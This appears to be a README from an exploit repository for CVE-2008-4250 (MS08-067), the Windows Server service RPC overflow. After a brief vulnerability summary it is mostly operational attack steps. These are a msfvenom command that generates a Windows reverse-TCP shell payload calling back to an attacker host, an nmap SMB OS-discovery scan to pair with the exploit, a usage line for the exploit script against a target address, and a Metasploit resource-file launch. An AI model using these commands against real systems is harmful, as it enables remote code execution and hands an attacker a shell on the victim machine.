# CVE-2008-4250

## Summary

The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka "Server Service Vulnerability." 

## Generating Shellcode

Just execute and paste into exploit code.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Also: nmap has a good OS discovery script that pairs well with this exploit:

```sh
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

## Usage

```sh
./ms08_067_2018.py xx.xx.xx.xx 1 445
```

## Metasploit

```sh
msfconsole -r ms08_067_netapi.rc
```
